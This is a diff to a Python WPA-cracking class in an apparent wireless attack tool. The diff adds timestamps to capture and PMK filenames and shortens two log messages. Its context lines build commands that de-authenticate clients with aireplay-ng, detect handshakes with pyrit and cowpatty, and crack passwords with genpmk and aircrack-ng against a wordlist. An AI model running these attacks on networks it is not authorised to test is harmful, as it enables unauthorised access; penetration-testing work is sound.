@@ -46,8 +46,8 @@ class WPA(EncryptionType):
 
         self.calculate_pmk()
 
-        pyrit_cmd = ['pyrit', '-r', self.write_directory + '/net_attack-01.cap', 'analyze']
-        cowpatty_cmd = ['cowpatty', '-c', '-r', self.write_directory + '/net_attack-01.cap']
+        pyrit_cmd = ['pyrit', '-r', self.write_directory + '/net_attack_' + str(self.timestamp) + '-01.cap', 'analyze']
+        cowpatty_cmd = ['cowpatty', '-c', '-r', self.write_directory + '/net_attack_' + str(self.timestamp) + '-01.cap']
         de_auth_cmd = ['aireplay-ng', '-0', '5', '--ignore-negative-one', '-a', self.bssid, '-D', self.interface]
         if self.silent_attack:
             super().show_message("Running silent attack (no de-authing)")
@@ -104,7 +104,7 @@ class WPA(EncryptionType):
         if self.pmk != "":
             self.kill_genpmk()
             cowpatty_cmd = ['cowpatty', '-d', self.pmk, '-s', self.essid, '-r',
-                            self.write_directory + '/net_attack-01.cap']
+                            self.write_directory + '/net_attack_' + str(self.timestamp) + '-01.cap']
             cowpatty_out, cowpatty_err = self.execute_command(cowpatty_cmd)
             cowpatty_out = cowpatty_out.decode('utf-8').split("\n")
             password = self.filter_cowpatty_psk(cowpatty_out)
@@ -114,7 +114,8 @@ class WPA(EncryptionType):
             else:
                 self.show_message("no password on pmk")
 
-        aircrack_cmd = ['aircrack-ng', self.write_directory + '/net_attack-01.cap', '-w', self.wordlist, '>',
+        aircrack_cmd = ['aircrack-ng', self.write_directory + '/net_attack_' + str(self.timestamp) + '-01.cap',
+                        '-w', self.wordlist, '>',
                         self.write_directory + '/aicrack-out']
         aircrack_out, aircrack_err = self.execute_command(aircrack_cmd)
         aircrack_out = aircrack_out.decode('utf-8')
@@ -129,8 +130,8 @@ class WPA(EncryptionType):
 
         :Author: Miguel Yanes Fernández
         """
-        self.pmk = self.write_directory + '/pmk'
-        genpmk_cmd = ['genpmk', '-f', self.wordlist, '-d', self.write_directory + '/pmk', '-s', self.essid]
+        self.pmk = self.write_directory + '/pmk_' + str(self.timestamp)
+        genpmk_cmd = ['genpmk', '-f', self.wordlist, '-d', self.pmk, '-s', self.essid]
         genpmk_thread = threading.Thread(target=self.execute_command, args=(genpmk_cmd,))
         genpmk_thread.start()
         genpmk_thread.join(0)
@@ -169,7 +170,7 @@ class WPA(EncryptionType):
             if line == 'No valid EAOPL-handshake + ESSID detected.':
                 return False
             elif 'handshake(s)' in line:
-                self.show_message("pyrit handshake: " + line)
+                self.show_message("Pyrit handshake detected")
                 return True
         return False
 
@@ -188,6 +189,6 @@ class WPA(EncryptionType):
                        'Try using a different capture.':
                 return False
             elif 'mount crack' in line:
-                self.show_message("cowpatty handshake: " + line)
+                self.show_message("Cowpatty handshake detected")
                 return True
         return False
